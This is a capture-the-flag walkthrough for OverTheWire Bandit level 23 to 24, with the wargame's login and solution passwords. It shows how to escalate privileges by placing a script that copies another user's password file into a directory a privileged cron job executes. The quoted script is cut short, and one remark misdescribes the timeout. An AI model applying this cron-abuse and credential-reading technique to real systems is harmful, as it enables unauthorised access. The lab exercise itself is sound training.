---
title: Bandit 23 -> 24

---

# Task
>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

>NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Server:bandit.labs.overthewire.org\
Port: 2220\
Username: bandit23\
Password: gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw

# Solution

Navigating and checking files:

```
bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls             
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job
bandit23@bandit:/etc/cron.d$ ls -la
total 56
drwxr-xr-x   2 root root  4096 Jul  3 16:19 .
drwxr-xr-x 124 root root 12288 Jun 25 12:37 ..
-rw-r--r--   1 root root   102 Nov  5  2025 .placeholder
-r--r-----   1 root root    47 Jun 24 14:59 behemoth4_cleanup
-rw-r--r--   1 root root   127 Jul  3 16:19 clean_tmp
-rw-r--r--   1 root root   120 Jun 24 14:59 cronjob_bandit22
-rw-r--r--   1 root root   122 Jun 24 14:59 cronjob_bandit23
-rw-r--r--   1 root root   120 Jun 24 14:59 cronjob_bandit24
-rw-r--r--   1 root root   188 Feb 13  2026 e2scrub_all
-r--r-----   1 root root    48 Jun 24 15:01 leviathan5_cleanup
-rw-------   1 root root   138 Jun 24 15:01 manpage3_resetpw_job
-rwx------   1 root root    52 Jun 24 15:03 otw-tmp-dir
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Reading what `cronjob_bandit24.sh` do:

```
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
```

First it sets the variable `myname` to the output of the command `whoami` in this case it is `bandit24`, then it changes the directory to `/var/spool/"$myname"/foo` or exit.

And for every file/folder in there except the current directory and previous direcotry, it'd run and then delete the file if it belongs to user bandit23.

So we need to create a bash script that copies the password from the file `/etc/bandit_pass/bandit24`

We should make a temporary directory first:

```
bandit23@bandit:~$ mktemp -d
/tmp/tmp.JHBjy1dp2F
bandit23@bandit:~$ cd /tmp/tmp.JHBjy1dp2F
```

Then create a script using nano and write in there with the following:

```
bandit23@bandit:/tmp/tmp.JHBjy1dp2F$nano pass.sh  

#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.JHBjy1dp2F/password
```

We can then create the password file using the command `touch`:

```
bandit23@bandit:/tmp/tmp.JHBjy1dp2F$ touch password
```

Then we should change the permission of the file using `chmod` so that the script can run under user bandit24 and user bandit23 can read the password file:

```
bandit23@bandit:/tmp/tmp.JHBjy1dp2F$ chmod 777 pass.sh
bandit23@bandit:/tmp/tmp.JHBjy1dp2F$ chmod 777 password
```

Then we can just copy the file from the current directory to the `/var/spool/bandit24/foo` where it is ran:

```
bandit23@bandit:/tmp/tmp.JHBjy1dp2F$ cp pass.sh /var/spool/bandit24/foo/
```

Then after a minute (since it timeouts for 60 seconds before the file is ran) we should get the password in our `password` file:

```
bandit23@bandit:/tmp/tmp.JHBjy1dp2F$ cat password
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```

# Password
```
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```